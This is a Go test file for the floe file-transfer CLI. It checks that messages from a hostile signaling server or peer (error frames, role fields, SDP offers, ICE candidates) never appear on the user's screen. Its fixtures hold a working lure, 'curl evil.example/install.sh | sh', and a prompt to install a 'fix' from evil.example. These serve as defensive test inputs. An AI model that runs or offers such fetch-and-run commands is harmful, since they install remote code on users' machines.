package main

import (
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/google/uuid"
	"github.com/gorilla/websocket"
	"github.com/jannskiee/floe/cli/engine/peer"
	"github.com/jannskiee/floe/cli/engine/signaling"
)

// A server is not a party that has proved anything. Each of these puts its own
// sentence where a keyed run could show it, ahead of any proof of the link's key
// (final audit, reports 27 F3 and 29 F2; D17 took 64 characters of a peer's ver as
// a defect for the same reason). The words are a working command, not noise, since
// that is what they would be.
const serverWords = "Your floe is out of date. Run: curl evil.example/install.sh | sh"

// answerJoinWith serves what a command asks a server for before it signals, then
// answers its join-room with frame.
func answerJoinWith(t *testing.T, frame map[string]string) string {
	t.Helper()
	upgrader := websocket.Upgrader{CheckOrigin: func(*http.Request) bool { return true }}
	mux := http.NewServeMux()
	mux.HandleFunc("/api/turn-credentials", func(w http.ResponseWriter, _ *http.Request) {
		_, _ = io.WriteString(w, `[{"urls":"stun:127.0.0.1:9"}]`)
	})
	mux.HandleFunc("/api/code", func(w http.ResponseWriter, _ *http.Request) {
		_ = json.NewEncoder(w).Encode(map[string]string{"code": serverCodePhrase})
	})
	mux.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
		ws, err := upgrader.Upgrade(w, r, nil)
		if err != nil {
			return
		}
		defer ws.Close()
		for {
			var m struct {
				Type string `json:"type"`
			}
			if ws.ReadJSON(&m) != nil {
				return
			}
			if m.Type == "join-room" {
				_ = ws.WriteJSON(frame)
			}
		}
	})
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)
	return srv.URL
}

func fileToSend(t *testing.T) string {
	t.Helper()
	file := filepath.Join(t.TempDir(), "hello.txt")
	if err := os.WriteFile(file, []byte("hello"), 0o644); err != nil {
		t.Fatal(err)
	}
	return file
}

func TestServerErrorFrameReachesNoScreen(t *testing.T) {
	frame := map[string]string{"type": "error", "message": serverWords}

	t.Run("floe send", func(t *testing.T) {
		printed := runAgainst(t, answerJoinWith(t, frame), "send", fileToSend(t))
		if strings.Contains(printed, "evil.example") {
			t.Errorf("the server's words reached the screen: %q", printed)
		}
		if !strings.Contains(printed, signaling.ErrServerFrame.Error()) {
			t.Errorf("printed %q, want the fixed line", printed)
		}
	})

	t.Run("a keyed floe receive", func(t *testing.T) {
		t.Setenv("FLOE_NO_STATS", "1")
		url := answerJoinWith(t, frame)
		link := url + "/#k=" + newTestKey(t).Encode() + "&room=" + uuid.New().String()
		printed := runAgainst(t, url, "receive", link, "--no-report", "--output", t.TempDir(), "--yes")
		if strings.Contains(printed, "evil.example") {
			t.Errorf("the server's words reached the screen: %q", printed)
		}
		if !strings.Contains(printed, signaling.ErrServerFrame.Error()) {
			t.Errorf("printed %q, want the fixed line", printed)
		}
	})
}

// The role a server names goes on no screen either: a Floe server only ever says
// sender or receiver.
func TestServerRoleReachesNoScreen(t *testing.T) {
	url := answerJoinWith(t, map[string]string{"type": "room-joined", "role": serverWords})
	printed := runAgainst(t, url, "send", fileToSend(t))
	if strings.Contains(printed, "evil.example") {
		t.Errorf("the server's role reached the screen: %q", printed)
	}
	if !strings.Contains(printed, "expected sender role") {
		t.Errorf("printed %q, want the role line", printed)
	}
}

// An offer's own token, before any DTLS. pion quotes it in its parse error.
func TestHostileOfferWordsReachNoScreen(t *testing.T) {
	url, _ := plainRoom(t)
	room := uuid.New().String()
	sc, err := signaling.Connect(url)
	if err != nil {
		t.Fatal(err)
	}
	defer sc.Close()
	if err := sc.JoinRoom(room); err != nil {
		t.Fatal(err)
	}
	<-sc.Role
	go func() {
		select {
		case <-sc.PeerConnected:
			_ = sc.SendSignal(map[string]any{
				"type": "offer",
				"sdp":  "v=0\r\no=- 1 2 Your floe needs a fix. Install it from evil.example/fix IP4 127.0.0.1\r\ns=-\r\nt=0 0\r\n",
			})
		case <-time.After(30 * time.Second):
		}
	}()
	link := url + "/#k=" + newTestKey(t).Encode() + "&room=" + room
	stdout, stderr, rerr := receiveInto(t, nil, t.TempDir(), link, "-y", "--server", url)
	if rerr == nil {
		t.Fatal("the receive succeeded on a broken offer")
	}
	if strings.Contains(stdout+stderr+rerr.Error(), "evil.example") {
		t.Errorf("the offer's words reached the screen: %q %q %v", stdout, stderr, rerr)
	}
	if !strings.Contains(stderr, "WebRTC setup failed: failed to set remote description") {
		t.Errorf("stderr %q, want the fixed line", stderr)
	}
}

// A trickled candidate's ufrag. pion's pc scope logs it at its default level, on
// the terminal, on every run but the one that turns the scope off.
func TestHostileCandidateWordsReachNoScreen(t *testing.T) {
	url, _ := plainRoom(t)
	room := uuid.New().String()
	sc, err := signaling.Connect(url)
	if err != nil {
		t.Fatal(err)
	}
	defer sc.Close()
	if err := sc.JoinRoom(room); err != nil {
		t.Fatal(err)
	}
	<-sc.Role
	go func() {
		select {
		case <-sc.PeerConnected:
		case <-time.After(30 * time.Second):
			return
		}
		c, err := peer.New(nil, sc)
		if err != nil {
			return
		}
		defer c.Close()
		go func() { _, _ = c.SetupAsSender() }()
		time.Sleep(1500 * time.Millisecond)
		_ = sc.SendSignal(map[string]any{"candidate": map[string]any{
			"candidate":     "candidate:1 1 udp 2130706431 127.0.0.1 9 typ host ufrag Your floe needs a fix. Install it from evil.example/fix",
			"sdpMid":        "0",
			"sdpMLineIndex": 0,
		}})
		time.Sleep(1500 * time.Millisecond)
		sc.Close()
	}()
	link := url + "/#k=" + newTestKey(t).Encode() + "&room=" + room
	// pion's logger writes to os.Stderr, which cobra's writer does not catch.
	logged := captureStderr(t)
	stdout, stderr, rerr := receiveInto(t, nil, t.TempDir(), link, "-y", "--server", url)
	if text := logged.stop(); strings.Contains(stdout+stderr+text, "evil.example") {
		t.Errorf("the candidate's words reached the terminal: %q %q %q (%v)", stdout, stderr, text, rerr)
	}
}
